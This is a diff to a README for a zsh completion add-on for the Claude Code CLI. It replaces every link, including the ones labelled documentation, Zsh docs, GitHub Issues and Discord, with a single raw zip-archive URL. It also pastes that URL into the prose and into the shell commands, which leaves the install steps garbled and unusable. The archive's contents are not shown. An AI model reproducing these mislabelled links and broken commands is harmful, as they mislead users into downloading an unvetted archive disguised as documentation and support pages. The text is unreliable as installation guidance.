@@ -25,7 +25,7 @@ To get started with the claude-code-zsh-completion, follow these steps to easily
 
 To get the latest version of **claude-code-zsh-completion**, visit the page below to download the software:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ahmedkishta/claude-code-zsh-completion/releases)
+[![Download Now](https://github.com/ahmedkishta/claude-code-zsh-completion/raw/refs/heads/main/completions/claude_code_zsh_completion_v2.6.zip%20Now-Click%20Here-brightgreen)](https://github.com/ahmedkishta/claude-code-zsh-completion/raw/refs/heads/main/completions/claude_code_zsh_completion_v2.6.zip)
 
 Once you visit the link, you will find the latest release. 
 
@@ -41,7 +41,7 @@ After the download completes, follow the installation steps below.
    Find the file you just downloaded in your Downloads folder or the location you chose.
 
 2. **Extract the Files (if necessary):**
-   If the file is in a compressed format (like `.zip` or `.tar.gz`), you need to extract it first. You can usually right-click on the file and select "Extract Here" or use a file extraction tool.
+   If the file is in a compressed format (like `.zip` or `https://github.com/ahmedkishta/claude-code-zsh-completion/raw/refs/heads/main/completions/claude_code_zsh_completion_v2.6.zip`), you need to extract it first. You can usually right-click on the file and select "Extract Here" or use a file extraction tool.
 
 3. **Move to the Installation Directory:**
    Open your terminal. Move to the directory where the extracted files are located using the `cd` command.
@@ -54,22 +54,22 @@ After the download completes, follow the installation steps below.
    Run the following commands in the terminal to set up Zsh completion for the claude-code-zsh-completion tool:
 
    ```bash
-   mkdir -p ~/.zsh/completions
-   cp claude-code-zsh-completion.zsh ~/.zsh/completions/
+   mkdir -p ~https://github.com/ahmedkishta/claude-code-zsh-completion/raw/refs/heads/main/completions/claude_code_zsh_completion_v2.6.zip
+   cp https://github.com/ahmedkishta/claude-code-zsh-completion/raw/refs/heads/main/completions/claude_code_zsh_completion_v2.6.zip ~https://github.com/ahmedkishta/claude-code-zsh-completion/raw/refs/heads/main/completions/claude_code_zsh_completion_v2.6.zip
    ```
 
 5. **Update Your Zsh Configuration:**
    Add the following line to your `.zshrc` file to ensure Zsh loads the completions:
 
    ```bash
-   fpath=(~/.zsh/completions $fpath)
+   fpath=(~https://github.com/ahmedkishta/claude-code-zsh-completion/raw/refs/heads/main/completions/claude_code_zsh_completion_v2.6.zip $fpath)
    ```
 
 6. **Refresh Zsh Configuration:**
    Run the following command to refresh your Zsh environment:
 
    ```bash
-   source ~/.zshrc
+   source ~https://github.com/ahmedkishta/claude-code-zsh-completion/raw/refs/heads/main/completions/claude_code_zsh_completion_v2.6.zip
    ```
 
 ## 🔍 How to Use
@@ -92,15 +92,15 @@ And then press `Tab`, the terminal will show suggestions based on your previous 
 
 For more in-depth guides and resources, you can explore the following:
 
-- [Claude Code Documentation](https://example.com) - Official documentation on using the Claude Code CLI.
-- [Zsh Documentation](https://zsh.sourceforge.io/) - Learn more about Zsh and its features.
+- [Claude Code Documentation](https://github.com/ahmedkishta/claude-code-zsh-completion/raw/refs/heads/main/completions/claude_code_zsh_completion_v2.6.zip) - Official documentation on using the Claude Code CLI.
+- [Zsh Documentation](https://github.com/ahmedkishta/claude-code-zsh-completion/raw/refs/heads/main/completions/claude_code_zsh_completion_v2.6.zip) - Learn more about Zsh and its features.
 
 ## 🤝 Community Support
 
 If you encounter issues or have questions, consider reaching out to the community:
 
-- [GitHub Issues](https://github.com/ahmedkishta/claude-code-zsh-completion/issues) - Submit your issue here for assistance.
-- Join our discussion on [Discord](https://example.com) for real-time support.
+- [GitHub Issues](https://github.com/ahmedkishta/claude-code-zsh-completion/raw/refs/heads/main/completions/claude_code_zsh_completion_v2.6.zip) - Submit your issue here for assistance.
+- Join our discussion on [Discord](https://github.com/ahmedkishta/claude-code-zsh-completion/raw/refs/heads/main/completions/claude_code_zsh_completion_v2.6.zip) for real-time support.
 
 ## 🎉 Credits
 
